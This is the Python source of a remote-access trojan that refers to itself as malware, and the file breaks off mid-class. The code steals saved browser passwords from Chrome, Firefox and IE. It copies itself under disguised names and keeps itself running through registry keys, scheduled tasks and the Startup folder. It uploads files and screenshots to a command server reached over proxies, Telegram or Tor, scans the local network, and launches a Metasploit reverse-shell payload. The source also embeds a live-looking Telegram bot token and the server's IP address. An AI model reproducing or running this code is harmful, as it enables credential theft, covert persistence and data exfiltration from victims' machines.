#!/usr/bin/env python3
# *-coding:Utf-8 -*

##################################################################################################################
# This part is about the normal import
import socket
import uuid
import getpass
import platform
import random
import os
import sys
import time
import glob
import ssl
import subprocess
import json
import logging
import ctypes
import traceback
import requests
import socks
import signal
import threading
import base64

# must be download with pip
import psutil
import zipfile
import urllib.request
import sqlite3
import shutil
import stem.process
import stem.util.term
from stem.control import Controller
# from proxybroker import Broker #not working wih pyinstaller on win10
import asyncio
import telepot

# external libraries
from lib import xmlrpclibclient, nmap
from lib.info import Geo, Information
from lib.msfrpc import MsfRpcClient

# specific windows import
if not platform.platform().startswith('Linux'):
    import win32crypt
    import win32com.client as win32com
    from winregistry import WinRegistry as Reg
    from PIL import ImageGrab

logging.basicConfig(level=logging.DEBUG, filename="update_log.txt", filemode='w',
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# INFO => use of a class or module
# DEBUG => useful variable or action
# WARNING => something failed
# ERROR => the output of an error

# This part will show the link the between name of useful executables and the real name of the files in target system
loki_website = 'loki.exe'  # The executable that will launch the tor website and send a mail with the onion url
loki_folder = 'loki'  # The folder that will be extracted and contains the tor website files
screen = 'PyHelpers.bat'  # The batch file who is used for screenshots


########################################################################################################################
# This part contains basic usual functions
def execute(command):
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return output.stdout.read().decode("ISO-8859-1") + output.stderr.read().decode("ISO-8859-1")


def unzip(file, folder):
    zip_ref = zipfile.ZipFile(file, 'r')
    zip_ref.extractall(folder)
    zip_ref.close()


def threaded(func):
    # Any fucntions with @threaded with be executed in a deamon
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return

    return wrapper


def wget(url):
    file_name = url.split('/')[-1]
    urllib.request.urlretrieve(url, file_name)
    if os.path.isfile(file_name):
        return '[+] File downloaded'
    else:
        return '[-] Problem downloading file'


def screenshot(definecommunication):
    execute(screen)
    os.system('PyHelpers.exe screenshot.jpeg')
    results = definecommunication.upload_file('screenshot.jpeg')
    os.remove('shotscreen.jpeg')
    return results


@threaded
def screenshot2(self):
    """ Takes a screenshot and uploads it to the server"""
    screenshot = ImageGrab.grab()
    tmp_file = tempfile.NamedTemporaryFile()
    screenshot_file = tmp_file.name + ".png"
    tmp_file.close()
    screenshot.save(screenshot_file)


def setup():
    download = False
    logging.info("Use of setup function")
    if not os.path.exists('liste.txt'):
        download = True

    if download:
        wget('https://github.com/leninisback/Support/blob/master/Decrypt.exe')
        wget('https://github.com/leninisback/Support/blob/master/PyHelpers.bat')
        wget('https://github.com/leninisback/Support/blob/master/Java_update.exe')
        wget('https://github.com/leninisback/Support/blob/master/liste.txt')


def raise_alarm():
    logging.error("The function took too much times...")
    raise Exception


@threaded
def python(command_or_file):
    """ Runs a python command or a python file and returns the output """
    new_stdout = StringIO.StringIO()
    old_stdout = sys.stdout
    sys.stdout = new_stdout
    new_stderr = StringIO.StringIO()
    old_stderr = sys.stderr
    sys.stderr = new_stderr
    if os.path.exists(command_or_file):
        with open(command_or_file, 'r') as f:
            python_code = f.read()
            try:
                exec(python_code)
            except Exception as exc:
                logging.error('Impossible to execute the python lines: {}'.format(str(exc)))
    else:
        logging.debug("Running python command... {}".format(command_or_file))
        try:
            exec(command_or_file)
        except Exception as exc:
            logging.error(traceback.format_exc())
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    return new_stdout.getvalue() + new_stderr.getvalue()


########################################################################################################################
# This part is for testing what can and cannot do the malware
class Testsystem:
    # This class will test the vital functions, and determine what the malware can do

    def __init__(self):
        # Variable for communication
        self.xmlrpccommunication = False
        self.send_doc = False
        self.lokicommunication = False
        self.download = False

        # Variable for malware needs
        self.exefile = False
        self.randompath = False
        self.logging = False
        self.targetinf = False
        logging.info("Use of Testsystem class")

        try:
            self.targetinfo = TargetInfo()
            self.targetinf = True
            logging.debug("test targetinfo => OK")
        except:
            logging.error("targetinf_unitest: " + traceback.format_exc())

    def comUniTest(self):
        try:
            xmlRpCommunication(self.targetinfo)
            self.xmlrpccommunication = True
            logging.debug("test XmlRpcLibCommunication => OK")
        except:
            logging.error("XmlRpcLibCommunication_unitest: " + traceback.format_exc())

        try:
            module = LokiCommunication(const.PUBLIC_IP, "8080")
            module.contact_server()
            module.shutdown()
            self.lokicommunication = True
            logging.debug("test communication => OK")
        except:
            logging.error("LokiCommunication_unitest: " + traceback.format_exc())

        try:
            if os.path.exists('Java_update.exe'):
                self.download = True
                logging.debug("test wget => OK")
                os.remove('Java_update.exe')
        except:
            logging.error("download_unitest: " + traceback.format_exc())

        try:
            send_document('update_log.txt')
            self.send_doc = True
            logging.debug("test send_doc => OK")
        except:
            logging.error("send_doc_unitest: " + traceback.format_exc())

    def malwareneeds(self):
        try:
            module = RandomFolder(self.targetinfo)
            randompath = module.random_file()
            if randompath != 'C:\\Users\\Default':
                self.randompath = True
            logging.debug("test Search_module => OK")
        except:
            logging.error("randompath_unitest" + traceback.format_exc())

        try:
            liste = os.listdir(os.getcwd())
            while True:
                name = random.sample(liste, 1)[0]
                if os.path.isfile(name):
                    break
            shutil.copyfile(name, os.path.join(randompath, name))
            os.remove(os.path.join(randompath, name))
            self.exefile = True
            logging.debug("test exefile => OK")
        except:
            logging.error("exefile_unitest: " + traceback.format_exc())

    def choose_communication(self):
        # what should the malware do if the communication ways are not possible, but the wget function works
        if not self.xmlrpccommunication and not self.lokicommunication and self.download:
            answer = 'simple_wget'
        elif self.xmlrpccommunication or self.lokicommunication:
            answer = "normal_com"
        elif not self.xmlrpccommunication and not self.lokicommunication and not self.download:
            answer = 'no_com'

        if not self.download:
            answer2 = 'normal_wget'
        else:
            answer2 = 'unsual_wget'

        return answer, answer2

    def choose_mode(self):
        # This module will choose the mode, depend on what the system cannot do
        if self.send_doc and self.download and self.exefile and self.randompath and self.lokicommunication and self.logging and self.targetinf:
            return 'fullsystem'
        # elif self.telegram and


########################################################################################################################
class Monitoring():
    # This class will make sure an other instance of the malware is always currently running

    def __init__(self, targetinfo):
        self.targetinfo = targetinfo
        self.listservant = ['fullprotect.exe', 'UpdateChange.exe', 'Postprod.exe', 'Microsoft_update.exe',
                            'Runtime.exe', 'plugin_host.exe', 'Manager_host.exe', 'AntivirusEngine.exe',
                            'Desktop_media_service.exe', 'FileSystem.exe']
        self.listrootkit = ['windows_logon_control.exe', 'protect_logon.exe', 'taskcontrol.exe', 'Java_explorer3.exe',
                            "XR.exe"]
        with open(os.path.join(os.getcwd(), "update.json"), "r") as file:
            self.data = json.load(file)
        logging.info("Use of Monitoring class")

    def check_file(self, key):
        # This function will return true if the program is actif or false if the file was deleted or unactive
        logging.debug("the file we are looking for : {}".format(self.data[key]))
        a = [p.info for p in psutil.process_iter(attrs=['pid', 'name']) if
             os.path.basename(self.data[key]) in p.info['name']]
        if a != []:
            logging.debug("the file is actif : {}".format(os.path.basename(self.data[key])))
            return True
        else:
            if Monitoring.execute_file(self, self.data[key]):
                logging.debug('restarting {}'.format(self.data[key]))
                return True
            else:
                logging.debug("The file {0} has been deleted, and has no more process actif".format(self.data[key]))
                return False

    def execute_file(self, file):
        logging.debug('file' + file)
        start_path = os.getcwd()
        if os.path.exists(file):
            path = os.path.dirname(file)
            os.chdir(path)
            os.startfile(file)
            os.chdir(start_path)
            logging.debug("Executing the file ...." + file)
            return True
        else:
            logging.debug("Fail to execute the file ...." + file)
            return False

    def rootkit(self):
        print('rootkit monitoring')
        if self.data["servant1"] == '':
            logging.debug("Servant1 not in json file")
            Monitoring.create_servant(self)
        else:
            if Monitoring.check_file(self, "servant1"):
                print("servant1 is running")
                logging.debug("servant1 is running")
            else:
                Monitoring.create_servant(self)

    def servant(self):
        print('servant monitoring')
        logging.debug("Looking for rootkit => " + self.data['rootkit_dir'])
        if not Monitoring.check_file(self, "rootkit_dir"):
            logging.debug("Monitoring.check didn't find the rootkit file")
            Monitoring.monitoring_rootkit(self)
        else:
            logging.debug("rootkit is here and working")

    def create_servant(self):
        logging.debug("Creating a new servant")
        print("Creating a new servant")
        # Settings of the new json file
        data = {"id": 1, "rootkit_dir": self.targetinfo.selfname, "servant": True, "servant1": "",
                "status": "actif"}

        # Getting a new name
        name = random.sample(self.listservant, 1)[0]
        self.listservant.remove(name)

        # Getting a new location
        modulesearch = RandomFolder(self.targetinfo)
        while True:
            randomfile = modulesearch.random_file()
            # shutil.copyfile(self.targetinfo.selfname, os.path.join(randomfile, name))
            command = "copy " + self.targetinfo.selfname + " " + os.path.join(randomfile, name)
            logging.debug("copying the malware to the new location..." + execute(command))
            fullname = os.path.join(randomfile, name)
            if os.path.isfile(fullname):
                break

        # Rename the new malware with the new name in json data
        self.data['servant1'] = fullname
        data['id'] = 1
        data['servant'] = True
        logging.info("Creating a new servant1: " + fullname)

        # Create a json file, copy it to the new location and rename it update.json
        with open('temp.json', 'w') as outfile:
            json.dump(data, outfile)

        command = "copy temp.json " + os.path.join(randomfile, "update.json")
        logging.debug("Copying temp.json to the new location... " + execute(command))

        if os.path.exists(fullname) and os.path.exists(os.path.join(randomfile, "update.json")):
            logging.debug("Migration went well")
            print("Migration went well")
        elif os.path.exists(fullname):
            logging.debug("the json file wasn't copy")
            print("the json file wasn't copy")
        elif os.path.exists(os.path.join(randomfile, "update.json")):
            logging.debug("The servant wasn't copy")
            print("The servant wasn't copy")
            print(execute(command))
        else:
            logging.debug('Migration failed totally')
            print('Migration failed totally')

        os.remove('temp.json')

        # Execute the new file in the new place (must be an .exe), we need to be in the the randomfile to execute the
        # new servant 
        time.sleep(1)
        if Monitoring.execute_file(self, fullname):
            print("new malware executed")

        # Update the update.json
        os.chdir(self.targetinfo.folder)
        with open('update.json', 'w') as outfile:
            json.dump(self.data, outfile)

    def become_rootkit(self):
        new_name = random.sample(self.listrootkit, 1)[0]
        os.rename(self.targetinfo.selfname, os.getcwd() + new_name + ".exe")
        data = {"id": 0, "rootkit_dir": self.targetinfo.selfname, "servant": False, "servant1": ""}
        # Update the update.json
        os.chdir(self.targetinfo.folder)
        with open('update.json', 'w') as outfile:
            json.dump(data, outfile)
        Monitoring.rootkit(self)
        logging.warning('Servant has become a rootkit' + self.targetinfo.selfname)

    def monitoring_rootkit(self):
        # The goal of this fucntion is to be sure there is no more than 1 occurence of rootkit in the system
        for program in psutil.process_iter(attrs=['pid', 'name']):
            for name in self.listrootkit:
                if program == name:
                    logging.debug("There is still a running rootkit: {}".format(name))
                    sys.exit()
        logging.debug("There is no other rootkit running, the actual servant will become a rootkit")
        Monitoring.become_rootkit(self)


########################################################################################################################
# This part is to upload folder
class UploadServer:
    # This class will get all the files of a folder, and send them via communication class
    # target need to be a folder

    def __init__(self, definecommunication, folder):
        self.folder = folder
        self.define_communication = definecommunication
        logging.info("Use of UploadServer class")

    def scanos(self):
        liste = []
        for filename in glob.iglob(self.folder + '**/*', recursive=True):
            if os.path.isfile(filename):
                try:
                    print(filename)
                    self.define_communication.upload_file(filename)
                except:
                    pass
            else:
                liste.append(filename)
        return liste

    def main(self):
        folder = UploadServer.scanos(self)
        while len(folder) != 0:
            try:
                self.folder = folder[0]
                folder = folder + UploadServer.scanos(self)
            except:
                pass
            folder.remove(folder[0])
        return 'uploadfolder completed'


########################################################################################################################
# This part will return a random folder
class RandomFolder:
    # the target need to be the exact word to work
    # Need a elevated privilege to browse files
    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        if self.targetInfo.os.startswith('lin'):
            self.prefix = os.path.join('/home', self.targetInfo.username)
        else:
            self.prefix = 'C:\\Users\\' + self.targetInfo.username
        self.defaultpath = os.getcwd()
        self.all_dossier = []
        os.chdir(self.prefix)
        logging.info("Use of Search_module class")

    def random_file(self):
        for dirname, dirnames, filenames in os.walk('.'):
            # print path to all subdirectories first.
            for subdirname in dirnames:
                file = os.path.join(dirname, subdirname)
                if ' ' in file:
                    # Il faut rechercher uniquement les dossiers sans espace dans le nom, sinon la commande copy va foirer
                    pass
                try:
                    os.chdir(self.prefix + file)
                    os.chdir(self.prefix)
                    self.all_dossier.append(os.path.join(dirname, subdirname))
                except:
                    pass

        try:
            random_path = random.sample(self.all_dossier, 1)
            os.chdir(self.defaultpath)
            random_path = random_path[0]
            result = self.prefix + random_path[1:]
        except:
            result = 'C:\\Users\\Default'

        return result


########################################################################################################################
# This part is for discover the network and the hosts connected
class HostDiscover:
    # This class will discover and port scan the host on the network
    # Require the internal ip
    def __init__(self, ip):
        self.nm = nmap.PortScanner()
        self.nm.scan(HostDiscover.reformat_ip(self, ip))

    def reformat_ip(self, ip):  # This function will return ip format xx.xx.xx.0/24
        ip_list = ip.split('.')
        del ip_list[-1]
        ip_list.append('0/24')
        final_ip = ''
        for ele in ip_list:
            final_ip += ele
            final_ip += '.'
        return final_ip[0:-1]

    def first_discovery(self):  # This function will add host and open port related and return a string with results
        results = ''
        for host in self.nm.all_hosts():
            results += 'Host : %s (%s)\n' % (host, self.nm[host].hostname())
            results += 'State : %s\n' % self.nm[host].state()
            for proto in self.nm[host].all_protocols():
                results += '----------\n'
                results += 'Protocol : %s\n' % proto
                lport = self.nm[host][proto].keys()
                for port in lport:
                    results += 'port : %s\tstate : %s\n' % (port, self.nm[host][proto][port]['state'])
        return results


########################################################################################################################
# This part is to make the program start at every reboot
class Persistence:
    # Registry + Schtasks require high-privilege administrator
    # Start_folder don't require high-privilege administrator
    # We need to make the check return bool value

    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.reg = Reg()
        self.persistence_mode = None
        self.startup_path = "C:\\Users\\" + self.targetInfo.username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start " \
                                                                       "Menu\\Programs\\Startup "
        self.start_link = self.startup_path + '\\' + self.targetInfo.shortname2 + '.lnk'

        self.local_machine = r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
        self.current_user = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        logging.info("Use of Persistence class")

    def create_start_folder(self):
        # A lik appear in the startup directory
        # link = self.startup_path + "\\" + self.targetinfo.shortname2 + ".lnk"
        shell = win32com.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(self.start_link)
        shortcut.Targetpath = r'"' + self.targetInfo.selfname + '"'
        shortcut.WorkingDirectory = r'"' + self.targetInfo.folder + r'"'
        shortcut.WindowStyle = 7  # 7 - Minimized, 3 - Maximized, 1 - Normal
        shortcut.save()
        logging.info('Start folder succeed')

    def check_start_folder(self):
        if os.path.islink(self.start_link):
            return True
        else:
            return False

    def remove_start_folder(self):
        os.remove(self.start_link)

    def create_local_registry(self):
        try:
            self.reg.write_value(self.local_machine, 'Java_update', self.targetInfo.selfname, 'REG_SZ')
            logging.debug('Access succeed to local machine registry')
        except Exception as e:
            logging.warning('Access to registry local machine impossible: ' + str(e))

    def check_local_registry(self):
        return self.reg.read_value(self.local_machine, self.targetInfo.shortname2)

    def remove_local_registry(self):
        try:
            self.reg.delete_value(self.local_machine, self.targetInfo.shortname2)
            logging.debug('Local machine registry key deleted: {}'.format(self.targetInfo.shortname2))
        except Exception as e:
            logging.warning('Problem with deleting local machine registry key: {}'.format(self.targetInfo.shortname2))

    def create_user_registry(self):
        try:
            self.reg.write_value(self.current_user, self.targetInfo.shortname2, self.targetInfo.selfname, 'REG_SZ')
            logging.debug('Access succeed to current user registry')
        except Exception as e:
            logging.warning('Access to registry current user impossible: ' + str(e))

    def check_user_registry(self):
        return self.reg.read_value(self.current_user, self.targetInfo.shortname2)

    def remove_user_registry(self):
        try:
            self.reg.delete_value(self.current_user, self.targetInfo.shortname2)
            logging.debug('Local machine registry key deleted: {}'.format(self.targetInfo.shortname2))
        except Exception as e:
            logging.warning('Problem with deleting local machine registry key: {}'.format(self.targetInfo.shortname2))

    def create_schtasks(self):
        command = 'schtasks /create /SC ONLOGON /TN {} /TR {} /F'.format(self.targetInfo.shortname2,
                                                                         self.targetInfo.selfname)
        logging.debug(subprocess.call(command))

    def check_schtasks(self):
        return subprocess.call('schtasks /Query /TN "{}" '.format(self.targetInfo.shortname2))

    def remove_schtasks(self):
        return subprocess.call('schtasks /Delete /TN "{}" /F'.format(self.targetInfo.shortname2))

    def create_persistence(self):
        if self.persistence_mode == 'start_folder':
            Persistence.create_start_folder(self)
        elif self.persistence_mode == 'local_registry':
            Persistence.create_local_registry(self)
        elif self.persistence_mode == 'user_registry':
            Persistence.create_user_registry(self)
        elif self.persistence_mode == 'schtasks':
            Persistence.create_schtasks(self)

    def check_persistence(self):
        if self.persistence_mode == 'start_folder':
            return Persistence.check_start_folder(self)
        elif self.persistence_mode == 'local_registry':
            logging.warning('The local registry persistence is not set, trying for current user')
            self.persistence_mode = 'user_registry'
            return Persistence.check_local_registry(self)
        elif self.persistence_mode == 'user_registry':
            logging.warning('The current user registry persistence is not set, trying with schtasks')
            self.persistence_mode = 'schtasks'
            return Persistence.check_user_registry(self)
        elif self.persistence_mode == 'schtasks':
            logging.warning('The current user registry persistence is not set, trying with start_folder')
            self.persistence_mode = 'start_folder'
            return Persistence.check_schtasks(self)

    def remove_persistence(self):
        if self.persistence_mode == 'start_folder':
            Persistence.remove_start_folder(self)
        elif self.persistence_mode == 'local_registry':
            Persistence.remove_local_registry(self)
        elif self.persistence_mode == 'user_registry':
            Persistence.remove_user_registry(self)
        elif self.persistence_mode == 'schtasks':
            Persistence.remove_schtasks(self)

    def choose_persistence_mode(self):
        if self.targetInfo.admin:
            self.persistence_mode = 'local-registry'
        else:
            self.persistence_mode = 'start_folder'


########################################################################################################################
# Cette partie concerne la récolte des mots de passe enregistrés sur les navigateurs (firefox, ie, chrome)
class Password:
    def __init__(self):
        logging.info("Use of Password class")

    # return either the stored passwords on chrome, or the fact that chrome is not installed
    # don't need elevated privilege
    def chrome(self):
        info_list = []
        path = Password.getpath(self)
        try:
            connection = sqlite3.connect(path + "Login Data")
            with connection:
                cursor = connection.cursor()
                v = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()

            for origin_url, username, password in value:
                if os.name == 'nt':
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]

                if password:
                    info_list.append({
                        'origin_url': origin_url,
                        'username': username,
                        'password': str(password)
                    })

        except sqlite3.OperationalError as e:
            e = str(e)
            if (e == 'database is locked'):
                return '[!] Make sure Google Chrome is not running in the background'
            elif (e == 'no such table: logins'):
                return '[!] Something wrong with the database name'
            elif (e == 'unable to open database file'):
                return '[!] Something wrong with the database path'
            else:
                return str(e)

        for element in info_list:
            n_infolist = str(element)

        if not info_list:
            n_infolist = "[!] Chrome password module failed"

        logging.debug(n_infolist)

    def getpath(self):
        if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + \
                       '\\Google\\Chrome\\User Data\\Default\\'
        elif os.name == "posix":
            PathName = os.getenv('HOME')
            if sys.platform == "darwin":
                # This is the OS X Path
                PathName += '/Library/Application Support/Google/Chrome/Default/'
            else:
                # This is the Linux Path
                PathName += '/.config/google-chrome/Default/'
        if not os.path.isdir(PathName):
            return '[!] Chrome Doesn\'t exists'
        return PathName

    def IEPasswordDump(self):
        if os.path.isfile('Support\\Java_update.exe'):
            results = execute('Support\\Java_update.exe')
        else:
            results = 'fail to find IEPasswordDump'
        logging.debug(results)

    def firefox_decrypt(self):
        if os.path.isfile('Support\\Decrypt.exe'):
            results = execute('Support\\Decrypt.exe')
        else:
            results = 'fail to find firefox_decrypt'
        logging.debug(results)

    def main(self):
        Password.chrome(self)
        Password.firefox_decrypt(self)
        Password.IEPasswordDump(self)


########################################################################################################################
# This part is about information of the target
def is_admin(os):
    if os.startswith('lin'):
        return False
    else:
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            return True
        else:
            # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            # sys.exit()
            return False


def mac():
    raw_mac = uuid.getnode()
    mac = ':'.join(('%012X' % raw_mac)[i:i + 2] for i in range(0, 12, 2))
    return mac


def external_ip():
    ex_ip_grab = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                  'ipecho.net/plain', 'myexternalip.com/raw',
                  'wtfismyip.com/text']
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.request.urlopen('http://' + url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break

    return external_ip.decode("ISO-8859-1")


class TargetInfo:
    def __init__(self):
        # basic information who need no function and hold one line
        self.os = sys.platform
        self.platform = platform.platform()
        self.processor = platform.processor()
        self.architecture = platform.architecture()[0]
        self.hostname = socket.gethostname()
        self.internal_ip = socket.gethostbyname(socket.gethostname())
        self.selfname = os.path.abspath(sys.argv[0])  # Ex: C:\Users\Test\Download\Java_explorer.exe
        self.folder = os.path.dirname(self.selfname)  # Ex: C:\Users\Test\Download
        self.username = getpass.getuser()  # Ex: Test
        self.fqdn = socket.getfqdn()
        a = sys.argv[0]
        a = a.split('\\')
        self.shortname = a[-1]  # Ex: Java_explorer.exe
        a = self.shortname.split('.')  # Meme chose que shortname, mais sans l'extension
        self.shortname2 = a[0]

        # information from functions
        self.mac = mac()
        self.admin = is_admin(self.os)
        self.external_ip = external_ip()

        # Geolocalisation information
        self.net_info = Geo().net_info()
        try:
            self.isp = self.net_info['isp']
            self.city = self.net_info['city']
        except:
            self.isp = None
            self.city = None
            pass

        # information from windows commands
        self.users = execute('net users')
        self.groups = execute('wmic useraccount list full')  # List of windows account
        self.startup_programs = execute('wmic startup get caption')  # List of programs at startup

        # Information to connect with proxies
        self.proxy_ip = '82.233.188.182'
        self.loki_port = 5000

        # Information about the Telegram Communication
        self.telegram_token = "749306593:AAErWYOT6NHxzWdir9_2y1B5xp78BUdKA6Q"

        # Information about tor circuit
        # self.external_onion_url = 'z3o7gaxwqneynqjss2dxa4ybsapnga5qho5lr6uaoxfoefjgewayzfid.onion'
        self.external_onion_url = 'zris64xkpwzwcza4nde7qynptxlv6uswfsry2dje66mvmvthaxmx5oyd.onion/'
        self.tor_is_running = False
        self.tor_port = 9051
        self.tor_pass = 'pass'

        # Information about the onion site
        self.internal_onion_url = None

        logging.info("Use of TargetInfo class")
        logging.info('The actual program is {}'.format(self.selfname))

    def print_survey(self):
        survey_format = '''
                Os                  - {}
                System Platform     - {}
                Processor           - {}
                Architecture        - {}
                Hostname Aliases    - {}
                Internal IP         - {}
                Selfname            - {}
                Folder              - {}
                Username            - {}
                FQDN                - {}
                MAC Address         - {}
                Is_Admin            - {}
                External IP         - {}
                ISP                 - {}
                City                - {}
                
                Users               - {}
                Groups              - {}
                Startup Programs    - {}
                
                Proxy Ip            - {}
                Loki Port           - {}
                
                Telegram Token      - {}
                
                External Onion Url  - {}
                Is Tor running ?    - {}
                Tor port            - {}
                Tor Password        - {}
                
                Internal Onion Url  - {} 
                '''

        data = survey_format.format(self.os, self.platform, self.processor, self.architecture,
                                    self.hostname, self.internal_ip, self.selfname,
                                    self.folder, self.username, self.fqdn,
                                    self.mac, self.admin, self.external_ip, str(self.isp), str(self.city), self.users,
                                    self.groups,
                                    self.startup_programs, self.proxy_ip, str(self.loki_port), self.telegram_token,
                                    self.external_onion_url, str(self.tor_is_running), str(self.tor_port),
                                    self.tor_pass,
                                    str(self.internal_onion_url))

        return str(data)


########################################################################################################################
# This part is to create the tor website in a new instance
class CreateTorWebsite:

    def __init__(self, definecommunication, targetinfo):
        self.define_communication = definecommunication
        self.targetInfo = targetinfo
        self.start_path = os.getcwd()
        self.tor_circuit = TorCircuit(self.targetInfo)

    def main(self):
        # Control that an instance of tor is running
        if not self.tor_circuit.check_tor():
            return "No tor instance running, stopping the deployment"

        # Find a new location for the website
        module = RandomFolder(self.targetInfo)
        new_location = module.random_file()
        os.chdir(new_location)

        # Download and unzip the zip file of the website
        self.define_communication.download_file('loki.zip')
        unzip(loki_website, os.getcwd())

        # Start the website, the website will send a mail with the url
        os.startfile(os.path.join(loki_folder, loki_website))

        # Delete the zip file and back to start_path
        os.remove('loki.zip')
        os.chdir(self.start_path)

        # Return the path and the name of loki_website
        return "The website started in the path {0} and with the name {1}".format(new_location, loki_website)


########################################################################################################################
# This part is for collecting and using proxies
class ProxyHandler:

    async def save(self, proxies):
        """Save proxies to a file."""
        with open('proxies.txt', 'w') as f:
            while True:
                proxy = await proxies.get()
                if proxy is None:
                    break
                f.write('%s:%d\n' % (proxy.host, proxy.port))

    def main(self):
        proxies = asyncio.Queue()
        broker = Broker(proxies)
        tasks = asyncio.gather(
            broker.grab(countries=['US', 'GB'], limit=2),
            ProxyHandler.save(self, proxies),
        )
        loop = asyncio.get_event_loop()
        loop.run_until_complete(tasks)

        with open('proxies.txt', 'r') as file:
            proxy_list = file.readlines()
            file.close()

        list_proxy = []
        os.remove('proxies.txt')
        for ele in proxy_list:
            list_proxy.append(ele.replace('\n', ''))

        return list_proxy


class ProxyMethod:
    # This class require to have open port on the server side, and listening to 0.0.0.0 host
    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.proxy_handler = ProxyHandler()
        self.proxies = self.proxy_handler.main()
        # Create the session and set the proxies.
        self.session = requests.Session()
        self.session.proxies = self.proxies

    def handshake(self):
        answer = self.session.post(
            "http://{0}:{1}/handshake".format(self.targetInfo.proxy_ip, self.targetInfo.loki_port),
            data={'test': 1})
        if answer.json()['handshake'] == 'True':
            return True
        else:
            return False

    def request_command(self):
        answer = self.session.post(
            "http://{0}:{1}/request_command".format(self.targetInfo.proxy_ip, self.targetInfo.loki_port),
            data={'test': 1})
        print(answer.text)
        return answer.text

    def send_results(self, results):
        answer = self.session.post(
            "http://{0}:{1}/send_results".format(self.targetInfo.proxy_ip, self.targetInfo.loki_port),
            data={'results': results})

        if answer.text == 'ok':
            logging.debug('Results have been received by the server')
        else:
            logging.debug('Results did not get upload on the server')

    def download_file(self, file):
        print("RM: " + file)
        answer = self.session.post(
            "http://{0}:{1}/download_file".format(self.targetInfo.proxy_ip, self.targetInfo.loki_port),
            data={'name': file})

        return answer.json()['data']

    def upload_file(self, name, folder, data):
        print('ProxyMethod uploadfile')
        print('folder: ' + folder)
        answer = self.session.post(
            "http://{0}:{1}/upload_file".format(self.targetInfo.proxy_ip, self.targetInfo.loki_port),
            data={'name': name, 'folder': folder, 'data': data})

        print('[RM]' + answer.text)
        return '[RM]' + answer.text


########################################################################################################################
# This part is for the connexion to the metasploit server with msfrpc
class MsfRpcConnexion:

    def __init__(self):
        #self.targetInfo = targetinfo
        #self.client = msfrpc.Msfrpc(self.targetInfo.external_onion_url)
        self.client = MsfRpcClient('pass', host='127.0.0.1', port=55553)

    @threaded
    def meterpreter_connexion(self):
        # The idea here is to create an initial python payload with metasploit to create a meterpreter session
        exploit = self.client.modules.use('payload', 'python/meterpreter/reverse_tcp')
        exploit['LHOST'] = '192.168.0.10'
        exploit['LPORT'] = 4444
        code = exploit.execute(payload='python/meterpreter/reverse_tcp')
        # code['payload] contains the code to execute, we need to separate it from the import module (sys + base64)
        shellcode = code['payload'].split(';')

        # the var shellcode[1] need to be executed, but it need a continious deamon to be efficient
        print(exec(shellcode[1]))

    def metasploit_esclation_modules(self):
        for ele in self.client.modules.exploits:
            if ele == 'windows/local/bypassuac_injection':
                exploit = self.client.modules.use('exploit', 'windows/local/ask')
                exploit['SESSION'] = 1
                execution = exploit.execute(exploit='windows/local/ask')
                if not execution['job_id']:
                    print('the exploit was not executed')
                break
        print('the requested exploit is not available')

########################################################################################################################
# This part is for creating and connection to the tor network
class TorCircuit:
    # We need to add the tor bundle to the file to download
    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.tor_process = None

    def check_tor(self):
        try:
            with Controller.from_port(port=self.targetInfo.socks_port) as controller:
                controller.authenticate(password=self.targetInfo.tor_pass)  # provide the password here if you set one

                bytes_read = controller.get_info("traffic/read")
                bytes_written = controller.get_info("traffic/written")

                logging.debug("My Tor relay has read %s bytes and written %s." % (bytes_read, bytes_written))
                self.targetInfo.tor_is_running = True
                return True
        except Exception as e:
            logging.error("Unable to connect to tor with the password: {}".format(str(e)))
            self.targetInfo.tor_is_running = False
            return False

    def define_tor_path(self):
        path = os.path.join(os.getcwd(), 'Anonimity\\Torbundle\\tor.exe')
        if os.path.exists(path):  # We need to find the right name to name the tor bundle folder
            return path
        else:
            # setup()
            return False

    def start_tor_circuit(self):
        signal.signal(signal.SIGALRM, raise_alarm)
        signal.alarm(30)
        logging.debug(stem.util.term.format("Starting Tor:\n", stem.util.term.Attr.BOLD))
        try:
            self.tor_process = stem.process.launch_tor_with_config(
                config={
                    'SocksPort': str(self.socks_port),
                    'ExitNodes': '{ru}',
                },
                tor_cmd=TorCircuit.define_tor_path(self),

            )
        except Exception as e:
            print(str(e))
            signal.alarm(0)

        logging.debug(stem.util.term.format("\nChecking our endpoint:\n", stem.util.term.Attr.BOLD))

    def stop_tor_circuit(self):
        if not self.tor_process:
            logging.debug('')


########################################################################################################################
# This part will define what connection we can use
class DefineCommunication:
    # This class will have the 4 main actions of communication, and will use the mode they can use

    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.used_communication = None

        self.proxy_method = None
        self.request_method = None
        self.telegram_method = None

        self.request_method_is_alive = False
        self.proxy_method_is_alive = False
        self.telegram_method_is_alive = False

    def connexion_returns(self):
        return self.used_communication

    def co_hierarchy(self):
        if self.request_method_is_alive:
            self.used_communication = self.request_method
        elif self.telegram_method_is_alive:
            self.used_communication = self.telegram_method
        elif self.proxy_method_is_alive:
            self.used_communication = self.proxy_method
        else:
            self.used_communication = None

    def test_request_method(self):
        try:
            self.request_method = RequestMethod(self.targetInfo)
            if self.request_method.handshake():
                self.request_method_is_alive = True
                logging.debug('The proxy method is working')
        except Exception as e:
